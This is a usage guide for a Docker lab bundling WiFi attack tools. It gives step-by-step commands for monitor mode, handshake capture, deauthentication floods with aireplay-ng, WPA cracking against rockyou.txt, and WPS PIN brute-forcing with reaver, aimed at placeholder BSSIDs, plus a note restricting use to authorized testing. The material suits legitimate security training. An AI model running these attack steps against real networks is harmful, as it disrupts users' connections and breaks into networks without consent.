# WiFi Penetration Testing Docker Lab Usage Guide

## Building the Image

```bash
# Save the Dockerfile and build the image
docker build -t wifi-pentest-lab .
```

## Running the Container

### Basic Usage (with USB WiFi adapter)

```bash
# Find your WiFi adapter
lsusb | grep -i wifi
iwconfig

# Run with specific device access
docker run -it --rm \
  --privileged \
  --net=host \
  --device=/dev/wlan1 \
  --name wifi-lab \
  wifi-pentest-lab
```

### Advanced Usage (with persistent storage)

```bash
# Create directories for persistent data
mkdir -p ~/wifi-lab/{captures,wordlists,scripts}

# Run with volume mounts
docker run -it --rm \
  --privileged \
  --net=host \
  --device=/dev/wlan1 \
  -v ~/wifi-lab/captures:/opt/captures \
  -v ~/wifi-lab/wordlists:/opt/wordlists \
  -v ~/wifi-lab/scripts:/opt/scripts \
  --name wifi-lab \
  wifi-pentest-lab
```

### USB Device Passthrough

```bash
# For USB WiFi adapters, pass through the USB bus
docker run -it --rm \
  --privileged \
  --net=host \
  --device=/dev/bus/usb \
  -v ~/wifi-lab:/opt/lab-data \
  --name wifi-lab \
  wifi-pentest-lab
```

## Quick Start Guide

### 1. Set Up Monitor Mode

```bash
# Inside the container
monitor wlan1
# Or manually:
airmon-ng check kill
airmon-ng start wlan1
```

### 2. Scan for Networks

```bash
# Quick scan
quickscan wlan1mon

# Or use airodump-ng directly
airodump-ng wlan1mon
```

### 3. Target Specific Network

```bash
# Capture handshake
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan1mon

# In another terminal (or tmux session)
aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan1mon
```

### 4. Crack with Aircrack-ng

```bash
aircrack-ng -w /opt/wordlists/rockyou.txt capture-01.cap
```

### 5. Use Wifite (Automated)

```bash
wifite --interface wlan1mon --crack --dict /opt/wordlists/rockyou.txt
```

## Tool Categories Available

### Core Aircrack-ng Suite

- `aircrack-ng` - WPA/WEP key cracker
- `airodump-ng` - Packet capture and network scanner
- `aireplay-ng` - Packet injection and deauth attacks
- `airmon-ng` - Monitor mode management
- `airdecap-ng` - Decrypt captured packets

### WPS Attacks

- `reaver` - WPS PIN brute force
- `bully` - Alternative WPS attack tool
- `pixiewps` - WPS pixie dust attack

### Automated Tools

- `wifite` - Automated WiFi auditing
- `airgeddon` - Multi-use WiFi auditing framework

### Hash Cracking

- `hashcat` - GPU-accelerated password cracking
- `john` - John the Ripper password cracker
- `pyrit` - GPU-accelerated WPA/WPA2 cracking

### Network Analysis

- `kismet` - Wireless network detector and analyzer
- `tshark` - Command-line Wireshark
- `tcpdump` - Packet analyzer

### Wordlist Generation

- `crunch` - Custom wordlist generator
- Pre-installed wordlists in `/opt/wordlists/`

## Useful Commands

### Check WiFi Interfaces

```bash
iwconfig
iw dev
```

### Monitor Mode Operations

```bash
# Start monitor mode
airmon-ng start wlan1

# Stop monitor mode
airmon-ng stop wlan1mon

# Kill interfering processes
airmon-ng check kill
```

### WPS Testing

```bash
# Scan for WPS-enabled networks
wash -i wlan1mon

# Attack WPS PIN
reaver -i wlan1mon -b AA:BB:CC:DD:EE:FF -vv
```

### Troubleshooting

#### Common Issues:

1. **No wireless interfaces**: Ensure USB device is properly passed through
2. **Monitor mode fails**: Run `airmon-ng check kill` first
3. **Permission denied**: Container needs `--privileged` flag
4. **Network issues**: Use `--net=host` for direct interface access

#### Checking Hardware:

```bash
# Inside container
lsusb | grep -i wifi
dmesg | tail -20
iw list
```

## Security Note

This lab environment is designed for educational purposes and authorized penetration testing only. Always ensure you have proper authorization before testing any wireless networks that you do not own.
